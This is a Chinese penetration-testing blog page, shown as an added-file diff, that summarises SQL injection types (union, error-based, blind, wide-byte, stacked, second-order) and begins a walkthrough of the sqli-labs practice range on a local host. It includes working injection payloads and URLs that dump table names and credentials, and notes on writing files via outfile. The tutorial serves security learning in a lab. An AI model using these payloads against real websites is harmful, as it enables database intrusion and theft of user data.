@@ -1,0 +1,571 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SQL注入总结 | Lucky Future的技术栈</title><meta name="keywords" content="android,安全,渗透测试,逆向"><meta name="author" content="LuckyFuture"><meta name="copyright" content="LuckyFuture"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="彻底理解sql注入漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入总结">
+<meta property="og:url" content="http://luckyfuture.top/sqli-summary.html">
+<meta property="og:site_name" content="Lucky Future的技术栈">
+<meta property="og:description" content="彻底理解sql注入漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630224530797.png">
+<meta property="article:published_time" content="2022-06-30T14:38:51.000Z">
+<meta property="article:modified_time" content="2022-07-03T03:58:24.772Z">
+<meta property="article:author" content="LuckyFuture">
+<meta property="article:tag" content="android,安全,渗透测试,逆向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630224530797.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://luckyfuture.top/sqli-summary"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?1347df1bbc1626b89dd2cc1d362b984c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-978LXQR6H1"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-978LXQR6H1');
+</script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-07-03 11:58:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/rss.xml" title="Lucky Future的技术栈" type="application/rss+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630224530797.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Lucky Future的技术栈</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-30T14:38:51.000Z" title="发表于 2022-06-30 22:38:51">2022-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-03T03:58:24.772Z" title="更新于 2022-07-03 11:58:24">2022-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/sqli-summary.html#post-comment"><span class="waline-comment-count" id="/sqli-summary.html"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入作为经典漏洞面试时经常问到。虽然使用sqlmap，xray等工具已经可以完全覆盖sql注入漏洞的验证到利用，但是为了告别手工测试时只会在参数后面打单引号的尴尬，我决定结合靶场实践对sql注入漏洞做一次全面的总结。</p>
+<hr>
+<h2 id="SQL注入产生原理"><a href="#SQL注入产生原理" class="headerlink" title="SQL注入产生原理"></a>SQL注入产生原理</h2><p>web应用程序没有对用户输入的合法性做判断，前端传入后端的参数是攻击者可控的，并且后端将参数带入数据库查询。由此攻击者可以构造sql语句对数据库进行操作。</p>
+<ul>
+<li>参数用户可控</li>
+<li>传入参数拼接到SQL语句，带入数据库查询</li>
+<li>应用程序对用户的输入没有进行严格的过滤</li>
+</ul>
+<h2 id="SQL注入基础知识"><a href="#SQL注入基础知识" class="headerlink" title="SQL注入基础知识"></a>SQL注入基础知识</h2><p>mysql5.0之后，默认有<code>information_schema</code>数据库，其中<code>SCHEMATA</code> 表的<code>SCHEMA_NAME</code>字段记录所有数据库名。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630183627457.png" alt="image-20220630183627457"></p>
+<p><code>TABLES</code>表的<code>TABLE_SCHEMA</code>字段记录所有数据库名，<code>TABLE_NAME</code>字段记录表名</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630183850167.png" alt="image-20220630183850167"></p>
+<p>COLUMNS表的<code>TABLE_SCHEMA</code> <code>TABLE_NAME</code> <code>COLUMN_NAME</code>字段分别记录所有数据库的库名，表名和字段名。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630184021096.png" alt="image-20220630184021096"></p>
+<p>通过运用这三个表进行查询，即可得知全部数据库的库名，表名和字段名。后续可以针对性的进行查询。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630184244385.png" alt="image-20220630184244385"></p>
+<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><ul>
+<li>Mysql 有三种常用注释符：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 注意，这种注释符后边有一个空格</span><br><span class="line"></span><br><span class="line"># 通过#进行注释</span><br><span class="line"></span><br><span class="line">/* */ 注释掉符号内的内容</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
+<li>group_concat() 函数，多条数据变为一条输出</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630215437544.png" alt="image-20220630215437544"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630215304327.png" alt="image-20220630215304327"></p>
+<ul>
+<li>limit()  可以控制输出的行数</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701205826363.png" alt="image-20220701205826363"></p>
+<p>输出一行，偏移量为0行</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701205901061.png" alt="image-20220701205901061"></p>
+<ul>
+<li>outfile</li>
+</ul>
+<p>outfile函数就是将数据库的查询内容导出到一个外部文件，前提是知道路径</p>
+<p><code>show variables like &#39;%secure%&#39;;</code>查看本机数据库的导出目录，如果随便导出到一个文件夹就会报错</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701220038747.png" alt="image-20220701220038747"></p>
+<p>secure_file_priv值为空时没有限制，成功写入文件</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701220124350.png" alt="image-20220701220124350"></p>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>按照参数类型分类：数字型和字符型。</p>
+<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">测试步骤：</span><br><span class="line"></span><br><span class="line">（1） 加单引号，URL：www.text.com/text.php?id=3’</span><br><span class="line">对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</span><br><span class="line"></span><br><span class="line">（2） 加and 1=1 ,URL：www.text.com/text.php?id=3 and 1=1</span><br><span class="line">对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</span><br><span class="line"></span><br><span class="line">（3） 加and 1=2，URL：www.text.com/text.php?id=3 and 1=2</span><br><span class="line">对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</span><br></pre></td></tr></table></figure>
+
+<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
+<p>见<a href="#Less-2">Less-2</a></p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符型sql语句如下：select * from table where name=&#x27;admin&#x27;</span><br><span class="line">在构造payload时通过闭合单引号可以成功执行语句：</span><br></pre></td></tr></table></figure>
+
+<p>见<a href="#Less-1">Less-1</a></p>
+<h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><p>SQL注入sql语句查询有回显时，可以使用Union注入获取数据</p>
+<ul>
+<li>出现两个及以上的<code>select</code></li>
+<li>select 的列数要相同</li>
+<li>可以使用union，列的数据类型必须兼容，兼容的含义是必须数据库可以隐含转换他们的类型</li>
+</ul>
+<p>先使用order by确认列数，即可使用union select查询，结果在回显位中</p>
+<p>见Less1-4</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入就是通过人为的引起数据库的报错，但是数据库在报错的同时会将查询的结果也呈现在报错中</p>
+<p>报错注入有很多函数可以利用</p>
+<p>见<a href="#Less-5">Less-5，6</a></p>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (PAYLOAD)a));</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701213025348.png" alt="image-20220701213025348"></p>
+<ul>
+<li>updatexml</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(PAYLOAD),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701213605276.png" alt="image-20220701213605276"></p>
+<p>要在where之后才执行</p>
+<ul>
+<li>group by floor 报错（mysql 5 可用）「重复键报错」</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(PAYLOAD),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701214211007.png" alt="image-20220701214211007"></p>
+<p>原理<a target="_blank" rel="noopener" href="https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/#group-by-floor-%E6%8A%A5%E9%94%99mysql-5-%E5%8F%AF%E7%94%A8%E9%87%8D%E5%A4%8D%E9%94%AE%E6%8A%A5%E9%94%99">参考连接</a> </p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ul>
+<li>length函数 返回字段长度</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702153949919.png" alt="image-20220702153949919"></p>
+<ul>
+<li>substr函数 切割字符串</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702154324811.png" alt="image-20220702154324811"></p>
+<ul>
+<li>ascii函数 将字符转换为ascii码值，一次只能转换一位</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702154640626.png" alt="image-20220702154640626"></p>
+<h4 id="Bool盲注"><a href="#Bool盲注" class="headerlink" title="Bool盲注"></a>Bool盲注</h4><p>没有回显或报错信息，只会返回正常（True）页面和不正常（False）页面。根据正常不正常的页面返回看是否有注入。</p>
+<p>见 <a href="#Less-8">Less-8</a></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>响应中没有任何信息，只能通过服务器响应的延时来判断sql语句是否执行。</p>
+<ul>
+<li>if函数</li>
+</ul>
+<p>MySQL中if函数语法如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr,v1,v2)</span><br></pre></td></tr></table></figure>
+
+<p>其中：表达式 expr 得到不同的结果，当 expr 为真是返回 v1 的值，否则返回 v2.</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702162015999.png" alt="image-20220702162015999"></p>
+<p>见<a href="#Less-9">Less-9</a></p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入也称为存储型注入，就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p>
+<p>二次注入的出现和代码逻辑关系密切。</p>
+<p>见<a href="#Less-24">Less-24</a></p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>当数据库采用gbk编码时，由于编码问题，导致数据库吃掉转义引号的反斜杠，从而引发宽字节注入。</p>
+<p>宽字节的格式先打一个<code>%df</code>，因为反斜杠的编码是<code>%5c</code>，在GBK编码中，<code>%df%5c</code>是一个繁体字。在这时原本被转义的单引号成功逃逸。</p>
+<p>所以理论上只要低位的范围中含有<code>0x5c</code>的编码，就可以进行宽字符注入。</p>
+<p>见<a href="#Less-32">Less-32</a></p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入，就是通过<code>;</code>将两个sql语句分开，在执行完第一个语句之后，后面的语句可以由攻击者任意指定，可以执行非查询语句，更改数据库配置，进行UDF提权等操作。该种注入威胁更大。</p>
+<p><strong>mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。（有这个函数才能进行堆叠）</strong></p>
+<p>不过这种攻击通常不能获得第二条语句的执行结果，可以使用update先写后查来获取数据，或者时间盲注，以及其它外带数据技巧。</p>
+<p>见<a href="#Less-38">Less-38</a></p>
+<h2 id="sqli-labs-靶场"><a href="#sqli-labs-靶场" class="headerlink" title="sqli-labs 靶场"></a><strong>sqli-labs</strong> 靶场</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>上来先打一个单引号，报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20and%201=1--+</span><br><span class="line">正常</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20and%201=2--+</span><br><span class="line">不报错，但无结果</span><br></pre></td></tr></table></figure>
+
+<p>通过上文方法可以判断这是一个字符型注入，因此需要闭合单引号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>通过order by获取字段数量，可以判断字段数为3</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630210740196.png" alt="image-20220630210740196"></p>
+<p>使用联合查询判断回显位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630212815275.png" alt="image-20220630212815275"></p>
+<blockquote>
+<p>为什么id=-1 才能有回显？</p>
+</blockquote>
+<p>经过测试发现不一定非得是-1，一个极大数字比如1000也可以回显。关于这个问题我上手调试了一下</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630213639489.png" alt="image-20220630213639489"></p>
+<p>当第一个select有结果时，返回两条数据。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630213732638.png" alt="image-20220630213732638"></p>
+<p>第一个select无结果时，就只有一条数据了，这样原有的回显位就成了union select的内容。</p>
+<blockquote>
+<p>可惜没把数据库教材带回来，教材关于union select的用法肯定更详细</p>
+</blockquote>
+<p>有了回显便可以构造sql语句查询了</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630214300624.png" alt="image-20220630214300624"></p>
+<p>我们现在已经知道了数据库名security，接下来去<code>information_schema.COLUMNS</code>中查询表名和字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=dds%27%20union%20select%201,(select%20group_concat(TABLE_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=%22security%22),user()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630214959998.png" alt="image-20220630214959998"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630215632522.png" alt="img"></p>
+<blockquote>
+<p>这里出现问题了，我的数据库里不止一张表叫users，导致查出很多字段名，应该再多加一个条件</p>
+</blockquote>
+<p>查询所有用户名和密码</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630220733508.png" alt="image-20220630220733508"></p>
+<p>第一关结束</p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=1%20%20and%201=1--+	正常</span><br><span class="line">http://127.0.0.1/sqli/Less-2/?id=1%20%20and%201=2--+	不报错 无查询结果</span><br></pre></td></tr></table></figure>
+
+<p>看来第二关是一个数字型的注入，无需闭合单引号。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630221421399.png" alt="image-20220630221421399"></p>
